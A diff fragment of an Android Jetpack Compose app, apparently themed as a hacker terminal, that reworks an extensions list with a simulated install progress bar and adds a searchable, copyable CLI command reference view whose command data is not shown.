-                                                        Text(text = ext.version, color = GhostGreen, fontSize = 10.sp, fontFamily = FontFamily.Monospace)
+                                                    Spacer(modifier = Modifier.width(10.dp))
+                                                    Column {
+                                                        Text(
+                                                            text = ext.name,
+                                                            color = if (isInstalled) activeAccentColor else Color.White,
+                                                            fontWeight = FontWeight.Bold,
+                                                            fontSize = 14.sp
+                                                        )
+                                                        Row(horizontalArrangement = Arrangement.spacedBy(6.dp)) {
+                                                            Text(text = ext.category, color = BorderGreen, fontSize = 10.sp, fontFamily = FontFamily.Monospace)
+                                                            Text(text = ext.version, color = GhostGreen, fontSize = 10.sp, fontFamily = FontFamily.Monospace)
+                                                        }
+                                                    }
+                                                }
+
+                                                if (isInstalled) {
+                                                    Row(verticalAlignment = Alignment.CenterVertically) {
+                                                        Icon(Icons.Default.CheckCircle, contentDescription = "Installed", tint = activeAccentColor, modifier = Modifier.size(16.dp))
+                                                        Spacer(modifier = Modifier.width(4.dp))
+                                                        Text("INSTALLED", color = activeAccentColor, fontSize = 11.sp, fontWeight = FontWeight.Bold)
+                                                        
+                                                        Spacer(modifier = Modifier.width(8.dp))
+                                                        // Toggle Uninstall Button for major custom extensions
+                                                        IconButton(
+                                                            onClick = {
+                                                                installedExtensions.remove(ext.id)
+                                                                Toast.makeText(context, "Uninstalled '${ext.name}'!", Toast.LENGTH_SHORT).show()
+                                                            },
+                                                            modifier = Modifier.size(24.dp)
+                                                        ) {
+                                                            Icon(
+                                                                imageVector = Icons.Default.Delete,
+                                                                contentDescription = "Uninstall extension",
+                                                                tint = BrightRed,
+                                                                modifier = Modifier.size(16.dp)
+                                                            )
+                                                        }
+                                                    }
+                                                } else if (isInstalling) {
+                                                    Text("INSTALLING $installProgress%", color = AmberYellow, fontSize = 11.sp, fontWeight = FontWeight.Bold, fontFamily = FontFamily.Monospace)
+                                                } else {
+                                                    Button(
+                                                        onClick = {
+                                                            scope.launch {
+                                                                installingExtensionId = ext.id
+                                                                installProgress = 0
+                                                                while (installProgress < 100) {
+                                                                    delay(40)
+                                                                    installProgress += (15..28).random()
+                                                                    if (installProgress > 100) installProgress = 100
+                                                                }
+                                                                installedExtensions.add(ext.id)
+                                                                installingExtensionId = null
+                                                                Toast.makeText(context, "Activated '${ext.name}'!", Toast.LENGTH_SHORT).show()
+                                                            }
+                                                        },
+                                                        colors = ButtonDefaults.buttonColors(containerColor = DarkGrey),
+                                                        border = BorderStroke(1.dp, activeAccentColor),
+                                                        contentPadding = PaddingValues(horizontal = 12.dp, vertical = 6.dp),
+                                                        modifier = Modifier.testTag("install_${ext.id}")
+                                                    ) {
+                                                        Text("INSTALL", color = activeAccentColor, fontSize = 11.sp, fontWeight = FontWeight.Bold)
                                                     }
                                                 }
                                             }
 
-                                            if (isInstalled) {
-                                                Row(verticalAlignment = Alignment.CenterVertically) {
-                                                    Icon(Icons.Default.CheckCircle, contentDescription = "Installed", tint = activeAccentColor, modifier = Modifier.size(16.dp))
-                                                    Spacer(modifier = Modifier.width(4.dp))
-                                                    Text("INSTALLED", color = activeAccentColor, fontSize = 11.sp, fontWeight = FontWeight.Bold)
-                                                    
-                                                    Spacer(modifier = Modifier.width(8.dp))
-                                                    // Toggle Uninstall Button for major custom extensions
-                                                    IconButton(
-                                                        onClick = {
-                                                            installedExtensions.remove(ext.id)
-                                                            Toast.makeText(context, "Uninstalled '${ext.name}'!", Toast.LENGTH_SHORT).show()
-                                                        },
-                                                        modifier = Modifier.size(24.dp)
+                                            Spacer(modifier = Modifier.height(8.dp))
+                                            Text(
+                                                text = ext.description,
+                                                color = TextGreen,
+                                                fontSize = 11.sp
+                                            )
+
+                                            if (isInstalling) {
+                                                Spacer(modifier = Modifier.height(8.dp))
+                                                LinearProgressIndicator(
+                                                    progress = { installProgress / 100f },
+                                                    modifier = Modifier.fillMaxWidth().height(4.dp),
+                                                    color = NeonGreen,
+                                                    trackColor = DarkGrey
+                                                )
+                                            }
+                                        }
+                                    }
+                                }
+                            }
+                        } else {
+                            // COMMAND REFERENCE VIEW (100 CLI Commands)
+                            Text(
+                                text = "CLI COMMAND DATABASE",
+                                color = activeAccentColor,
+                                style = MaterialTheme.typography.titleMedium,
+                                fontWeight = FontWeight.Bold,
+                                fontFamily = FontFamily.Monospace,
+                                modifier = Modifier.padding(bottom = 4.dp)
+                            )
+                            Text(
+                                text = "Access 100 major pre-compiled hacker & system utility scripts. Tap COPY to buffer them immediately into your clipboard.",
+                                color = GhostGreen,
+                                fontSize = 11.sp,
+                                modifier = Modifier.padding(bottom = 10.dp)
+                            )
+
+                            // Search Bar for Commands
+                            OutlinedTextField(
+                                value = commandSearchQuery,
+                                onValueChange = { commandSearchQuery = it },
+                                placeholder = { Text("Search 100 commands...", color = GhostGreen, fontSize = 12.sp) },
+                                leadingIcon = { Icon(Icons.Default.Search, contentDescription = "Search", tint = activeAccentColor, modifier = Modifier.size(16.dp)) },
+                                modifier = Modifier
+                                    .fillMaxWidth()
+                                    .height(48.dp)
+                                    .testTag("command_search_input"),
+                                colors = OutlinedTextFieldDefaults.colors(
+                                    focusedBorderColor = activeAccentColor,
+                                    unfocusedBorderColor = DarkGrey,
+                                    focusedContainerColor = CardGrey,
+                                    unfocusedContainerColor = CardGrey,
+                                    focusedTextColor = Color.White,
+                                    unfocusedTextColor = Color.White
+                                ),
+                                textStyle = TextStyle(fontFamily = FontFamily.Monospace, fontSize = 12.sp),
+                                singleLine = true,
+                                shape = RoundedCornerShape(6.dp)
+                            )
+
+                            Spacer(modifier = Modifier.height(10.dp))
+
+                            // Category chips selector
+                            val categoriesList = listOf("All", "System", "Setup", "Network", "Hacking", "Cryptography", "Utilities")
+                            Row(
+                                modifier = Modifier
+                                    .fillMaxWidth()
+                                    .padding(vertical = 4.dp),
+                                horizontalArrangement = Arrangement.spacedBy(6.dp),
+                                verticalAlignment = Alignment.CenterVertically
+                            ) {
+                                androidx.compose.foundation.lazy.LazyRow(
+                                    horizontalArrangement = Arrangement.spacedBy(6.dp)
+                                ) {
+                                    items(categoriesList) { cat ->
+                                        val isSelected = selectedCommandCategory == cat
+                                        Box(
+                                            modifier = Modifier
+                                                .clip(RoundedCornerShape(4.dp))
+                                                .background(if (isSelected) activeAccentColor else CardGrey)
+                                                .clickable { selectedCommandCategory = cat }
+                                                .border(1.dp, if (isSelected) activeAccentColor else DarkGrey, RoundedCornerShape(4.dp))
+                                                .padding(horizontal = 8.dp, vertical = 4.dp)
+                                        ) {
+                                            Text(
+                                                text = cat.uppercase(),
+                                                color = if (isSelected) Color.Black else GhostGreen,
+                                                fontSize = 10.sp,
+                                                fontWeight = FontWeight.Bold,
+                                                fontFamily = FontFamily.Monospace
+                                            )
+                                        }
+                                    }
+                                }
+                            }
+
+                            Spacer(modifier = Modifier.height(10.dp))
+
+                            // Filter the 100 commands dynamically
+                            val filteredCommands = remember(commandSearchQuery, selectedCommandCategory) {
+                                commandsList.filter { cmd ->
+                                    val matchQuery = commandSearchQuery.isEmpty() ||
+                                            cmd.command.contains(commandSearchQuery, ignoreCase = true) ||
+                                            cmd.description.contains(commandSearchQuery, ignoreCase = true)
+                                    val matchCategory = selectedCommandCategory == "All" || cmd.category == selectedCommandCategory
+                                    matchQuery && matchCategory
+                                }
+                            }
+
+                            // Render list
+                            LazyColumn(
+                                verticalArrangement = Arrangement.spacedBy(10.dp),
+                                modifier = Modifier.weight(1f)
+                            ) {
+                                if (filteredCommands.isEmpty()) {
+                                    item {
+                                        Box(
+                                            modifier = Modifier
+                                                .fillMaxWidth()
+                                                .padding(32.dp),
+                                            contentAlignment = Alignment.Center
+                                        ) {
+                                            Text(
+                                                "NO COMMANDS MATCHING SEARCH CRITERIA",
+                                                color = BrightRed,
+                                                fontFamily = FontFamily.Monospace,
+                                                fontSize = 11.sp,
+                                                fontWeight = FontWeight.Bold
+                                            )
+                                        }
+                                    }
+                                } else {
+                                    items(filteredCommands) { cmd ->
+                                        var isCopied by remember { mutableStateOf(false) }
+                                        val clipboardScope = rememberCoroutineScope()
+
+                                        Card(
+                                            modifier = Modifier
+                                                .fillMaxWidth()
+                                                .border(
+                                                    width = 1.dp,
+                                                    color = if (isCopied) NeonGreen else activeAccentColor.copy(alpha = 0.35f),
+                                                    shape = RoundedCornerShape(8.dp)
+                                                ),
+                                            colors = CardDefaults.cardColors(containerColor = CardGrey)
+                                        ) {
+                                            Column(modifier = Modifier.padding(12.dp)) {
+                                                Row(
+                                                    modifier = Modifier.fillMaxWidth(),
+                                                    horizontalArrangement = Arrangement.SpaceBetween,
+                                                    verticalAlignment = Alignment.CenterVertically
+                                                ) {
+                                                    // Category Badge
+                                                    Box(
+                                                        modifier = Modifier
+                                                            .background(activeAccentColor.copy(alpha = 0.12f), RoundedCornerShape(4.dp))
+                                                            .border(1.dp, activeAccentColor.copy(alpha = 0.3f), RoundedCornerShape(4.dp))
+                                                            .padding(horizontal = 6.dp, vertical = 2.dp)
+                                                    ) {
+                                                        Text(
+                                                            text = cmd.category.uppercase(),
+                                                            color = activeAccentColor,
+                                                            fontSize = 9.sp,
+                                                            fontFamily = FontFamily.Monospace,
+                                                            fontWeight = FontWeight.Bold
+                                                        )
+                                                    }
+
+                                                    // Clipboard interactive action
+                                                    Row(
+                                                        verticalAlignment = Alignment.CenterVertically,
+                                                        modifier = Modifier
+                                                            .clip(RoundedCornerShape(4.dp))
+                                                            .clickable {
+                                                                val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
+                                                                val clip = ClipData.newPlainText("BlackRoot Command", cmd.command)
+                                                                clipboard.setPrimaryClip(clip)
+                                                                isCopied = true
+                                                                Toast.makeText(context, "Copied command!", Toast.LENGTH_SHORT).show()
+                                                                clipboardScope.launch {
+                                                                    delay(1500)
+                                                                    isCopied = false
+                                                                }
+                                                            }
+                                                            .border(1.dp, if (isCopied) NeonGreen else activeAccentColor, RoundedCornerShape(4.dp))
+                                                            .padding(horizontal = 8.dp, vertical = 4.dp)
+                                                            .testTag("copy_cmd_${cmd.command.hashCode()}")
                                                     ) {
                                                         Icon(
-                                                            imageVector = Icons.Default.Delete,
-                                                            contentDescription = "Uninstall extension",
-                                                            tint = BrightRed,
-                                                            modifier = Modifier.size(16.dp)
+                                                            imageVector = if (isCopied) Icons.Default.Check else Icons.Default.ContentCopy,
+                                                            contentDescription = "Copy command",
+                                                            tint = if (isCopied) NeonGreen else activeAccentColor,
+                                                            modifier = Modifier.size(12.dp)
+                                                        )
+                                                        Spacer(modifier = Modifier.width(4.dp))
+                                                        Text(
+                                                            text = if (isCopied) "COPIED" else "COPY",
+                                                            color = if (isCopied) NeonGreen else activeAccentColor,
+                                                            fontSize = 10.sp,
+                                                            fontWeight = FontWeight.Bold,
+                                                            fontFamily = FontFamily.Monospace
                                                         )
                                                     }
                                                 }
-                                            } else if (isInstalling) {
-                                                Text("INSTALLING $installProgress%", color = AmberYellow, fontSize = 11.sp, fontWeight = FontWeight.Bold, fontFamily = FontFamily.Monospace)
-                                            } else {
-                                                Button(
-                                                    onClick = {
-                                                        scope.launch {
-                                                            installingExtensionId = ext.id
-                                                            installProgress = 0
-                                                            while (installProgress < 100) {
-                                                                delay(40)
-                                                                installProgress += (15..28).random()
-                                                                if (installProgress > 100) installProgress = 100
-                                                            }
-                                                            installedExtensions.add(ext.id)
-                                                            installingExtensionId = null
-                                                            Toast.makeText(context, "Activated '${ext.name}'!", Toast.LENGTH_SHORT).show()
-                                                        }
-                                                    },
-                                                    colors = ButtonDefaults.buttonColors(containerColor = DarkGrey),
-                                                    border = BorderStroke(1.dp, activeAccentColor),
-                                                    contentPadding = PaddingValues(horizontal = 12.dp, vertical = 6.dp),
-                                                    modifier = Modifier.testTag("install_${ext.id}")
+
+                                                Spacer(modifier = Modifier.height(8.dp))
+
+                                                // Executable command representation
+                                                Box(
+                                                    modifier = Modifier
+                                                        .fillMaxWidth()
+                                                        .background(PitchBlack, RoundedCornerShape(4.dp))
+                                                        .border(1.dp, DarkGrey, RoundedCornerShape(4.dp))
+                                                        .padding(10.dp)
                                                 ) {
-                                                    Text("INSTALL", color = activeAccentColor, fontSize = 11.sp, fontWeight = FontWeight.Bold)
+                                                    Text(
+                                                        text = cmd.command,
+                                                        color = TextGreen,
+                                                        fontFamily = FontFamily.Monospace,
+                                                        fontSize = 12.sp,
+                                                        fontWeight = FontWeight.Bold
+                                                    )
                                                 }
+
+                                                Spacer(modifier = Modifier.height(6.dp))
+
+                                                // Context description
+                                                Text(
+                                                    text = cmd.description,
+                                                    color = Color.White.copy(alpha = 0.85f),
+                                                    fontSize = 11.sp,
+                                                    style = MaterialTheme.typography.bodySmall
+                                                )
                                             }
-                                        }
-
-                                        Spacer(modifier = Modifier.height(8.dp))
-                                        Text(
-                                            text = ext.description,
-                                            color = TextGreen,
-                                            fontSize = 11.sp
-                                        )
-
-                                        if (isInstalling) {
-                                            Spacer(modifier = Modifier.height(8.dp))
-                                            LinearProgressIndicator(
-                                                progress = { installProgress / 100f },
-                                                modifier = Modifier.fillMaxWidth().height(4.dp),
-                                                color = NeonGreen,
-                                                trackColor = DarkGrey
-                                            )
                                         }
                                     }
                                 }
@@ -2133,6 +2516,12 @@ data class ExtensionItem(
     val version: String,
     val author: String,
     val category: String
+)
+
+data class CliCommandItem(
+    val command: String,
+    val category: String,
+    val description: String
 )
 
 fun getFileIconAndColor(fileName: String, isIconsPackInstalled: Boolean): Pair<String, Color> {
